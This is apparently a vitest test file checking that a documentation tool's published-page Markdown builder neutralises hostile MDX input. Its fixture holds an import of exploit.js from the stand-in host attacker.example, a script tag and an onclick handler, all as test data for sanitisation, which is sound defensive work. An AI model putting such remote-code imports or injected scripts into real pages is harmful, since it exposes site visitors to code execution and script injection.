import { describe, expect, it } from 'vitest';
import { buildPublishedPageMarkdown } from './published-markdown';

describe('published page Markdown', () => {
  it('uses the shared inert MDX projection for the live representation', () => {
    const body = buildPublishedPageMarkdown({
      project: { config: { visibility: 'public' } },
      languageConfig: null,
      page: {
        title: 'Setup',
        description: ' Safe setup. ',
        content:
          'import Exploit from "https://attacker.example/exploit.js"\n\n<Callout>**Portable**</Callout>\n\n<script>run()</script>\n\n<Raw onclick="run()">text</Raw>',
        config: null,
      },
    });

    expect(body).toBe('# Setup\n\n> Safe setup.\n\n&gt; **Portable**\n\n\n\n&lt;Raw onclick=&quot;run()&quot;&gt;text&lt;/Raw&gt;\n');
    expect(body).not.toContain('Exploit');
    expect(body).not.toContain('<script>');
  });
});
